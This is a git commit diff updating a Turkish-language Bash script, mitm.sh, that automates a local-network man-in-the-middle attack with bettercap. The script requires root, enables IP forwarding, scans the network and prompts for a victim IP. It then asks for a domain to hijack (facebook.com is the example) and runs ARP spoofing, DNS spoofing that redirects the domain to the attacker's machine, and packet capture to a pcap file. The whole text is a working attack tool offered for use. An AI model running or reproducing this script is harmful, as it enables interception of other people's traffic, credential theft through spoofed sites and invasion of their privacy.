c609a976341af82851160c7d819bc4dd2afce708
Welat <mysorfiloxanon@protonmail.com>
2025-06-02 20:42:54 +0000

    Update mitm.sh

--- mitm.sh
+++ mitm.sh
@@ -1,44 +1,76 @@
 #!/bin/bash
 
-# Renkli çıktı için fonksiyonlar
 info() { echo -e "\e[34m[INFO]\e[0m $1"; }
 warn() { echo -e "\e[33m[WARN]\e[0m $1"; }
 good() { echo -e "\e[32m[OK]\e[0m $1"; }
+fail() { echo -e "\e[31m[FAIL]\e[0m $1"; }
+
+# root kontrolü
+if [[ "$EUID" -ne 0 ]]; then
+  fail "Bu script root olarak çalıştırılmalı!"
+  exit 1
+fi
 
 # Ağ arayüzü tespiti
 iface=$(ip route | grep default | awk '{print $5}')
+if [[ -z "$iface" ]]; then
+  fail "Ağ arayüzü tespit edilemedi!"
+  exit 1
+fi
 good "Kullanılan ağ arayüzü: $iface"
 
-# Bettercap yüklü mü?
+# Bettercap kontrolü
 if ! command -v bettercap &> /dev/null; then
-  warn "bettercap yüklü değil, kurulum başlatılıyor..."
-  sudo apt install bettercap -y
+  warn "Bettercap yüklü değil, yükleniyor..."
+  apt update && apt install bettercap -y
 fi
 
-# Ağ taraması başlat
+sysctl net.ipv4.ip_forward | grep -q "1" || {
+  info "IP yönlendirme aktif değil, etkinleştiriliyor..."
+  sysctl -w net.ipv4.ip_forward=1
+}
+
 info "Ağ taraması yapılıyor (5 saniye)..."
-sudo bettercap -iface "$iface" -eval "net.probe on; sleep 5; net.show" > bettercap_output.txt &
+bettercap -iface "$iface" -eval "net.probe on; sleep 5; net.show" > bettercap_output.txt &
 sleep 6
 
-# Hedef IP seçimi
-grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" bettercap_output.txt | sort -u | nl
+ip_list=($(grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" bettercap_output.txt | sort -u))
+if [[ ${#ip_list[@]} -eq 0 ]]; then
+  fail "Ağda cihaz bulunamadı!"
+  exit 1
+fi
+
+echo -e "\nBulunan IP adresleri:"
+for i in "${!ip_list[@]}"; do
+  echo "[$((i+1))] ${ip_list[$i]}"
+done
+
+
 echo
-read -p "Saldırmak istediğin hedefin numarasını seç (1,2...): " target_num
-target_ip=$(grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" bettercap_output.txt | sort -u | sed -n "${target_num}p")
+read -p "Saldırmak istediğin hedefin numarasını seç (1-${#ip_list[@]}): " target_num
+target_ip=${ip_list[$((target_num-1))]}
 
-good "Hedef seçildi: $target_ip"
+if [[ -z "$target_ip" ]]; then
+  fail "Geçersiz seçim!"
+  exit 1
+fi
+good "Hedef IP: $target_ip"
 
-# DNS spoof için hedef domainler
-read -p "Yönlendirmek istediğin alan ad(lar)ı (örn: facebook.com): " spoof_domains
+read -p "Yönlendirmek istediğin domain (örn: facebook.com): " spoof_domains
+if [[ -z "$spoof_domains" ]]; then
+  fail "Domain belirtmen gerekiyor!"
+  exit 1
+fi
 
-# MITM Başlatılıyor
-info "Bettercap MITM saldırısı başlatılıyor..."
+attacker_ip=$(hostname -I | awk '{print $1}')
+info "Spoof edilen alan adı $spoof_domains --> $attacker_ip yönlendirilecek"
 
-sudo bettercap -iface "$iface" -eval "
+info "MITM ve DNS spoof saldırısı başlatılıyor..."
+bettercap -iface "$iface" -eval "
 set arp.spoof.targets $target_ip;
 arp.spoof on;
 set dns.spoof.domains $spoof_domains;
-set dns.spoof.address $(hostname -I | awk '{print $1}');
+set dns.spoof.address $attacker_ip;
 dns.spoof on;
 set net.sniff.output mitm.pcap;
 net.sniff on;
